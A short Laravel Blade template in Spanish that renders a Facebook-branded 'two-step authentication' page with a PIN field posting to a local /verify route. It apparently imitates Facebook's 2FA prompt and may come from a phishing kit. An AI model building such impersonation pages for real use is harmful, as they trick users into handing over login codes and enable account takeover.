@extends('layouts.app')

@section('content')
    <center>
        <h1>Autenticación en dos pasos de Facebook</h1>
        <form action="/verify" method="POST">
            @csrf

            <br><label>PIN:</label>
            <input type="tel" name="pin">

            <br><input type="submit" value="Iniciar sesion">
        </form>
    </center>
@endsection
